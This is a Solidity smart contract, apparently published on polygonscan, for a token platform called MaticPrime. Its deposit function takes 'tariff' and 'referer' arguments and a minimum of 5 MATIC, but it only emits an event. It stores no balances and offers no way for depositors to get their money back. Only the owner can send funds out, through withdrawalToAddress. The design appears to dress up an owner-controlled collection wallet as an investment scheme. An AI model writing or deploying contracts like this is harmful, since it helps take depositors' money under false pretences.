/**
 *Submitted for verification at polygonscan.com on 2021-12-21
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.10;

/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}

contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}

contract MaticPrime is Ownable {    
    using SafeMath for uint256;   
    event DepositAt(address user, uint tariff, uint amount);    
    function deposit(uint tariff, address referer) external payable {
        require(msg.value >= 5000000000000000000,"Minimum deposit 5 MATIC");
        emit DepositAt(msg.sender, tariff, msg.value);
    }
    function withdrawalToAddress(address payable to, uint amount) external{
        require(msg.sender == owner);
        to.transfer(amount);
    }
    function transferOwnership(address to) public {
        require(msg.sender == owner, "Only owner");
        address oldOwner  = owner;
        owner = to;
        emit OwnershipTransferred(oldOwner,to);
    }
}